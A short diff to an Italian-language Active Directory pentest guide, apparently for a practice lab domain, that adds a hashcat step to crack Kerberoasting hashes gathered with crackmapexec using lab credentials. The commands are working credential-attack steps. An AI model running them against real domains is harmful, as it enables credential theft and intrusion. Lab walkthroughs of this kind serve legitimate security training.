@@ -71,3 +71,8 @@ Puoi usare anche crackmapexec per farlo
 ```bash
 cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
 ```
+
+Cracca gli hash
+```bash
+hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
+```
